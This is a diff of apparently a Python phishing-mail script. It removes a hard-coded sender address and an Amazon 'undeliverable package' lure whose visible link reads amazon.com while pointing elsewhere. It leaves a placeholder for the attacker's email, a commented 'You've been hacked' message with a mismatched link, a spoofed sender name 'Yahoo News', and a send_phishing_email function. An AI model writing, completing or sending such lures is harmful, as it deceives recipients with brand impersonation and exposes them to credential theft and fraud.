@@ -5,21 +5,14 @@ import json
 
 from datetime import datetime
 
-sender_email = "imperialy1337@gmail.com"
+sender_email = "" ### ADD YOUR EMAIL HERE
 app_password = ""
 
 with open('password.txt', 'r') as file:
     app_password = file.read()
 
 subject = "Fraud Alert"
-#message = "You've been hacked! return to <a href='http://www.example.com'>https://google.com/</a>"
-message = '''
-Your Amazon package arrived at the warehouse but could not be delivered due to incomplete address information. 
-Please confirm your address in the link.
-<a href='http://www.example.com'>https://amazon.com/</a>
-
-Amazon team wishes you a wonderful day!
-'''
+#message = "You've been hacked! return to <a href='http://www.example.com'>https://google.com/</a>" # ADD YOUR SPOOFED EMAIL HERE
 spoofed_user = "Yahoo News"
 
 def send_phishing_email(recipient):
